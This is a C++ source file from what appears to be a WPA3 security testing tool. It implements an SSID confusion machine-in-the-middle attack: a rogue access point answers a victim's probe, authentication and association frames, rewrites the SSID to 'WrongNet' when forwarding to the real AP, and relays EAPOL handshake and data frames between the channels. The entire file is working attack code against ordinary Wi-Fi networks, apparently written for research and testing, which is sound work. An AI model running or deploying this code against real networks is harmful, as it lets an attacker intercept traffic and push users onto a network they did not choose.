#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "system/hw_capabilities.h"
namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

void SsidConfusion::send_to_real(PDU &pdu) const {
	const std::vector<uint8_t> raw = pdu.serialize();
    send_to_real(raw);
}

void SsidConfusion::send_to_real(const vector<uint8_t> &raw) const{
	auto translated = raw;
	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac), false);
	sock_real->send(translated, netconfig.real_channel);
}

FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>()) {
		const bool directed = dot11.addr1() == HWAddress<6>(ap.get(SK::mac));
		const bool wildcard = dot11.addr1() == HWAddress<6>::broadcast;
		if(!directed && !wildcard) return STOP;
		//client_state.update_state(ClientState::Finding);
		probe_resp->addr1(addr2);

		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
		resp->addr1(addr2);
		send_to_rogue(*resp);

		display_traffic(*pdu, "Rogue channel", " -- Replied");
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
			// Open System Auth seq=1 ->  seq=2 success
			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac)); //not ap
			resp.addr3(rogue_ap->get(SK::mac));
			resp.auth_seq_number(2);
			resp.auth_algorithm(0);
			resp.status_code(0);

			send_to_rogue(resp);
			display_traffic(dot11, "Rogue channel", " -- Replied");

			//send_to_real(dot11);
			//client_state.update_state(ClientState::Authenticated);

			return STOP;
		}
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const {
	// EAPOL STA -> AP
	if(addr1 == rogue_ap.get(SK::mac) && addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
		int eapol_msg = get_eapol_msg_num(pdu);
		log(LogLevel::DEBUG, "Rogue channel: EAPOL {} detected, addr1={}, addr2={}",
			eapol_msg, addr1, addr2);

		if(eapol_msg == 2 || eapol_msg == 4) {
			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA -> AP", eapol_msg);
			const vector<uint8_t> raw = pdu.serialize();
			send_to_real(raw);
			return STOP;
		}
		return STOP;
	}
	return CONTINUE;
}


void rewrite_ssid_in_frame(vector<uint8_t> &raw, const string &new_ssid) {
	if(raw.size() < 6) return;
	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (raw[3] << 8);

	// 802.11 mgmt header = 24 B; AssocReq fixed = 4 B, ReassocReq fixed = 10 B
	const uint8_t subtype = (raw[rt_len] >> 4) & 0x0F;
	const size_t fixed = (subtype == 2) ? 10 : 4;
	const size_t ie_start = rt_len + 24 + fixed;

	if(raw.size() < ie_start + 2) return;

	for(size_t i = ie_start; i + 1 < raw.size(); ) {
		if(raw[i] == 0) {  // SSID IE
			const size_t old_len = raw[i + 1];
			const size_t new_len = min(new_ssid.size(), (size_t)32);
			raw.erase(raw.begin() + i + 2, raw.begin() + i + 2 + old_len);
			raw.insert(raw.begin() + i + 2,
				reinterpret_cast<const uint8_t*>(new_ssid.data()),
				reinterpret_cast<const uint8_t*>(new_ssid.data()) + new_len);
			raw[i + 1] = static_cast<uint8_t>(new_len);
			return;
		}
		i += 2 + raw[i + 1];
	}
}

FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11,  const vector<uint8_t> &raw) const {
	const Dot11ManagementFrame::rates_type rates = {
		static_cast<Dot11ManagementFrame::rates_type::value_type>(82),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(84),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(139),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(150),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(36),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(48),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(72),
		static_cast<Dot11ManagementFrame::rates_type::value_type>(96),
	};

	if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()) {
		Dot11AssocResponse resp(addr2, rogue_ap.get(SK::mac));
		resp.status_code(0);
		resp.capabilities() = assoc->capabilities();
		resp.aid(1);
		resp.supported_rates(rates);
		send_to_rogue(resp);
	} else if(const auto *reassoc = dot11.find_pdu<Dot11ReAssocRequest>()) {
		Dot11ReAssocResponse resp(addr2, rogue_ap.get(SK::mac));
		resp.addr3(rogue_ap.get(SK::mac));
		resp.status_code(0);
		resp.capabilities() = reassoc->capabilities();
		resp.aid(1);
		resp.supported_rates(rates);
		send_to_rogue(resp);
	} else {
		return CONTINUE;
	}
	//client_state.update_state(ClientState::Associated);
	display_traffic(dot11, "Rogue channel", " -- Replied");

	auto translated = raw;
	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac));

	log(LogLevel::DEBUG, "Forwarding Assoc to Real AP with WrongNet SSID");
	sock_real->send(translated, netconfig.real_channel);

	return STOP;
}

void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const std::vector<uint8_t> &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
			return;
			}
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
	SOLVE_OR_CONTINUE(handle_open_auth(addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr1, addr2, *pdu))

#undef SOLVE_OR_CONTINUE

	if(addr2 == sta.get(SK::mac)) {
		// This is traffic involving the real AP
		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
		send_to_real(*pdu);
	}
}

}